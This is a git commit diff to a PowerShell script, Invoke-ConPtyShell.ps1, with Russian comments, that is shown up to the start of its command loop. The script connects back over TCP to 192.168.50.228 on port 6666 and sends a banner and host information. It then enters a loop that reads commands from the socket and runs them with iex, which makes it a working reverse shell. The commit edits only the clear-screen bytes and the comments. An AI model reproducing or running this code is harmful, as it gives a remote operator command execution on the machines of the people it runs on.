b31a08f6d4602e10f49e530f24faf6965fcaba14
Lev Vedrov <102747673+zipo0@users.noreply.github.com>
2025-04-09 00:51:34 +0300

    Update Invoke-ConPtyShell.ps1

--- Invoke-ConPtyShell.ps1
+++ Invoke-ConPtyShell.ps1
@@ -2,12 +2,14 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.50.228",6666);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 
-# ANSI escape code для очистки экрана и перемещения курсора влево вверх
-$clearScreen = [System.Text.Encoding]::ASCII.GetBytes("`e[2J`e[H")
-$stream.Write($clearScreen, 0, $clearScreen.Length)
+# ANSI escape-последовательность очистки экрана (в байтах)
+$esc = [char]27
+$clear = "$esc[2J$esc[H"
+$clearBytes = [System.Text.Encoding]::ASCII.GetBytes($clear)
+$stream.Write($clearBytes, 0, $clearBytes.Length)
 $stream.Flush()
 
-# ASCII-баннер
+# ASCII баннер
 $banner = @"
  ________  .__              __________                .___           
  \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
@@ -29,15 +31,13 @@ IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressT
 ---------------------------------------------------
 "@
 
-# Объединение и отправка
+# Отправка баннера и системной информации
 $intro = "$banner`n$sysinfo"
 $introBytes = [System.Text.Encoding]::ASCII.GetBytes($intro)
 $stream.Write($introBytes, 0, $introBytes.Length)
 $stream.Flush()
-Start-Sleep -Milliseconds 300
-$stream.Flush()
 
-# Reverse shell loop
+# Основной цикл команд
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
   $sendback = (iex $data 2>&1 | Out-String );
